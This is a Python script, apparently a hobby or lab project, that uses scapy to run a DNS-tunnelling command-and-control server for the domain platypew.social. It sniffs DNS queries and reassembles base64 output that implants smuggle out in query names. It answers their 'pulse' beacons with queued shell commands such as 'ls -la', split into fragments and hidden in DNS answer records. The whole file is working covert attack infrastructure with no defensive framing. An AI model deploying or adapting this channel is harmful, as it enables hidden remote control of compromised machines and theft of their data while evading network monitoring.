#!/usr/bin/env python3
from scapy.all import *
from base64 import b64encode, b64decode

PUBLIC_IP = "20.249.220.128"
IFACE = "eth0"
DOMAIN = "platypew.social"

FRAG_LEN = 70 - len(DOMAIN)

recv = b""
queue = [b"ls -la", b"ls", b"echo 'a super duper long command that definitely cannot be sent within one packet'"]
buf = []


def decode(data: bytes) -> bytes:
    data = b64decode(recv)
    return data


def reply(pkt, data=False) -> None:
    global buf
    # Construct the IP header
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    # Consturct the UDP header
    udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)

    if data is False:
        data = pkt[DNS].qd.qname

    z = 0
    if buf == []:
        z = 1

    # Construct the DNS header
    dns = DNS(id=pkt[DNS].id,
              qd=pkt[DNS].qd,
              aa=1,
              qr=1,
              z=z,
              an=DNSRR(rrname=data, type='A', ttl=600, rdata=PUBLIC_IP))

    send(ip / udp / dns, iface=IFACE, verbose=False)


def encode(data: bytes) -> list:
    data = data.strip()
    e_data = b64encode(data).decode()
    frag_e_data = [e_data[i:i + FRAG_LEN] for i in range(0, len(e_data), FRAG_LEN)]
    return frag_e_data


def fragment():
    global queue
    global buf

    if buf == [] and queue != []:
        buf = encode(queue.pop(0))


def pkt_callback(pkt) -> None:
    global recv
    global buf

    # Extract data from client
    data = pkt.qd.qname.split(f".{DOMAIN}".encode())[0]

    # Check if is pulse or reply
    if data != b"pulse":
        recv += data

        if pkt[DNS].z == 1:
            print(decode(recv).decode())
            recv = b""

        reply(pkt)
    else:
        fragment()
        if buf != []:
            reply(pkt, buf.pop(0) + f".{DOMAIN}")
        else:
            reply(pkt)


sniff(iface=IFACE, prn=pkt_callback, filter="udp dst port 53 and udp[10] & 0x80 = 0", store=0)
